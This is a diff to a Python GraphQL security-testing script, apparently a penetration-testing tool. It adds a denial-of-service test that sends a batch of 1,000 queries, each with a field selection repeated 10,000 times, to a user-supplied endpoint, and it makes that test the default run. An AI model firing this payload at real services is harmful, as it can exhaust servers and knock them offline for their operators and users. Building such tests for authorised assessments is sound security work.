@@ -306,6 +306,23 @@ def test_getUsers():
     except Exception as e:
         print("Error during getUsers testcase execution:", e)
 
+def test_denialOfService(url):
+    FORCE_MULTIPLIER = 10000
+    CHAINED_REQUESTS = 1000
+
+    queries = []
+
+    payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
+    query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}
+
+    for _ in range(0, CHAINED_REQUESTS):
+        queries.append(query)
+
+    r = requests.post(url, json=queries)
+    print_green("[+] denialOfService testcase successfully executed.")
+    print('Time took: {} seconds '.format(r.elapsed.total_seconds()))
+    print('Response:', r.json())
+
 if __name__ == "__main__":
     print_banner()
     choice = input("Do you want to enter an endpoint manually or use a JSON file? Enter 'manual' or 'json': ").strip().lower()
@@ -333,7 +350,8 @@ if __name__ == "__main__":
         # test_sql_injection()
         # test_path_traversal()
         # test_permissions()
-        test_getUsers()
+        # test_getUsers()
+        test_denialOfService(GRAPHQL_URL)
 
         # test_capitalize_field_argument()
         # test_show_network_directive()
